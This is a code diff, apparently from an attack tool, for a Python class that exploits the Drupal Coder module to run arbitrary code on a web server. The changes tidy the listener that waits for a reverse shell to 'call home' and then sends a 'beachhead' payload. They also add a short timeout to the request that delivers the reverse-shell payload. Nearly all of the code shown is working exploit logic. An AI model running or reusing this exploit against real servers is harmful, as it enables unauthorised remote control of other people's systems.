@@ -70,19 +70,17 @@ class DrupalCoderExec:
 
         HOST = ""
         PORT = 53616  # Hardcoded for now and reflects the port in the reverse shell
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.bind((HOST, PORT))
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.bind((HOST, PORT))
 
-        print("DRUPAL: Waiting for reverse shell")
-        sock.listen(1)
+            print("DRUPAL: Waiting for reverse shell")
+            sock.listen(1)
 
-        conn, addr = sock.accept()
-        print("DRUPAL: Shell called home")
+            conn, addr = sock.accept()
+            print("DRUPAL: Shell called home")
 
-        conn.sendall(payload.encode("utf-8"))
-        print("DRUPAL: Sent beachhead")
-
-        sock.close()
+            conn.sendall(payload.encode("utf-8"))
+            print("DRUPAL: Sent beachhead")
 
     def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
         """Exploit the Drupal Coder module to execute arbitrary code on the server
@@ -100,8 +98,13 @@ class DrupalCoderExec:
 
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
         params = {"file": self.create_payload(self.REV_SHELL)}
+
+        # Reverse shell doesn't call home, so don't wait for response
         print("DRUPAL: Sending reverse shell")
-        requests.get(url=url, params=params)
+        try:
+            requests.get(url=url, params=params, timeout = 0.5)
+        except requests.exceptions.ReadTimeout:
+            pass
 
         print("DRUPAL: Reverse shell sent")
         thread.join()
